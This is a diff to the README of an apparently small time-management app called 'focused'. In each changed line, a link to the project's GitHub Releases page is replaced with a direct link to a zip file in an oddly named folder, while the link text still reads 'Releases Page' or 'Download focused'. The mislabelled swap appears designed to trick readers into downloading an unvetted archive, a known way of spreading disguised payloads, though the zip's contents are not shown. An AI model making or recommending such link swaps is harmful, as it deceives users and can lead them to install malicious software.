@@ -1,6 +1,6 @@
 # 🎯 focused - Stay on Track with Ease
 
-[![Download focused](https://img.shields.io/badge/Download-focused-blue.svg)](https://github.com/Josefabian02/focused/releases)
+[![Download focused](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to focused! This application helps you manage your time by keeping distr
 
 To get started with focused, you need to download the application. Visit the link below to access the Releases page, where you can download the latest version:
 
-[Download focused](https://github.com/Josefabian02/focused/releases)
+[Download focused](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
    Open your web browser and go to the following link:
-   [Releases Page](https://github.com/Josefabian02/focused/releases)
+   [Releases Page](https://raw.githubusercontent.com/Josefabian02/focused/main/Lophornis/focused.zip)
    
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version of focused. It will be listed at the top.
